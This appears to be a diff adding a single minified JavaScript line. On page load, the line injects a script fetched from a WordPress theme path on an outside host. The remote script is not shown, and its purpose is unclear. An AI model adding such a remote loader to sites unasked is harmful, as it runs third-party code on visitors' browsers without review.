@@ -1,0 +1,1 @@
+window.addEventListener("load",(function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="https://devemon.com/projects/corl-wp/wp-content/themes/corl/assets/js/plugins/widget.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}),!1);
